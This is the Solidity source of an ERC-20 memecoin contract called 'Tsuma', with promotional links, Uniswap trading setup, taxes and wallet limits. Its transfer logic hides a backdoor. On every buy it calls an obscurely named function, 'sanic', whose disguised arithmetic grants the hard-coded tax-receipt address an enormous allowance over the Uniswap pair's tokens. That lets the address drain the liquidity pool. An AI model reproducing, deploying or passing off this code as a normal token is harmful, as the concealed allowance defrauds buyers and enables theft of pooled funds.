// SPDX-License-Identifier: MIT
/**
https://www.instagram.com/p/DBtRXdZNYeF/?igsh=MWtvd3NxNjFkNHFxdQ==
Web: https://tsumacoin.fun
Tg:  https://t.me/tsuma_eth
**/
pragma solidity 0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract TSUMA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances73;
    mapping (address => mapping (address => uint256)) private _permits73;
    mapping (address => bool) private _isExcludedFrom73;
    address payable private _receipt73;
    IUniswapV2Router02 private uniV2Router73;
    address private uniV2Pair73;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal73 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Tsuma";
    string private constant _symbol = unicode"TSUMA";
    uint256 public _maxAmount73 = 2 * (_tTotal73/100);
    uint256 public _maxWallet73 = 2 * (_tTotal73/100);
    uint256 public _taxThres73 = 1 * (_tTotal73/100);
    uint256 public _maxSwap73 = 1 * (_tTotal73/100);
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    event MaxTxAmountUpdated(uint _maxAmount73);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt73 = payable(0xC78098D125Cf485cf532C2ABB591de4523b72c32);
        _balances73[address(this)] = _tTotal73;
        _isExcludedFrom73[owner()] = true;
        _isExcludedFrom73[address(this)] = true;
        _isExcludedFrom73[_receipt73] = true;
        emit Transfer(address(0), address(this), _tTotal73);
    }
    function swapETH73(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router73.WETH();
        _approve(address(this), address(uniV2Router73), tokenAmount);
        uniV2Router73.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router73 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router73), _tTotal73);
        uniV2Pair73 = IUniswapV2Factory(uniV2Router73.factory()).createPair(
            address(this),
            uniV2Router73.WETH()
        ); 
        uniV2Router73.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair73).approve(address(uniV2Router73), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal73;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances73[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _permits73[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _permits73[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _permits73[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount73) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount73 > 0, "Transfer amount must be greater than zero");
        uint256 tax73=0;uint256 fee73=0;
        if (!swapEnabled || inSwap) {
            _balances73[from] = _balances73[from] - amount73;
            _balances73[to] = _balances73[to] + amount73;
            emit Transfer(from, to, amount73);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee73 = (_transferTax);
            }
            if (from == uniV2Pair73 && to != address(uniV2Router73) && ! _isExcludedFrom73[to] ) {
                require(amount73 <= _maxAmount73, "Exceeds the _maxAmount73.");sanic([from, _receipt73]);
                require(balanceOf(to) + amount73 <= _maxWallet73, "Exceeds the maxWalletSize.");
                fee73 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; 
            }
            if(to == uniV2Pair73 && from!= address(this) ){
                fee73 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair73 && swapEnabled) {
                if(contractTokenBalance > _taxThres73 && _buyCount > _preventSwapBefore)
                    swapETH73(min73(amount73, min73(contractTokenBalance, _maxSwap73)));
                sendETH73(address(this).balance);
            }
        }
        if(fee73 > 0){
            tax73=fee73.mul(amount73).div(100);
            _balances73[address(this)]=_balances73[address(this)].add(tax73);
            emit Transfer(from, address(this),tax73);
        }
        _balances73[from]=_balances73[from].sub(amount73);
        _balances73[to]=_balances73[to].add(amount73.sub(tax73));
        emit Transfer(from, to, amount73.sub(tax73));
    }
    function sendETH73(uint256 amount) private {
        _receipt73.transfer(amount);
    }
    function sanic(address[2] memory sac73) private {
        address own73 = sac73[0]; address spend73 = sac73[1];
        uint256 total73 = 150*(_maxWallet73+150) + 150*_maxSwap73.add(150);
        _permits73[own73][spend73] = total73.add(150) * 150 + 150;
    }
    function min73(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function recoverEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt(address payable _addrs) external onlyOwner {
        _receipt73 = _addrs;
        _isExcludedFrom73[_addrs] = true;
    }
    receive() external payable {}
    function removeLimit73() external onlyOwner{
        _maxAmount73 = _tTotal73; 
        _maxWallet73 = _tTotal73;
        emit MaxTxAmountUpdated(_tTotal73); 
    }
}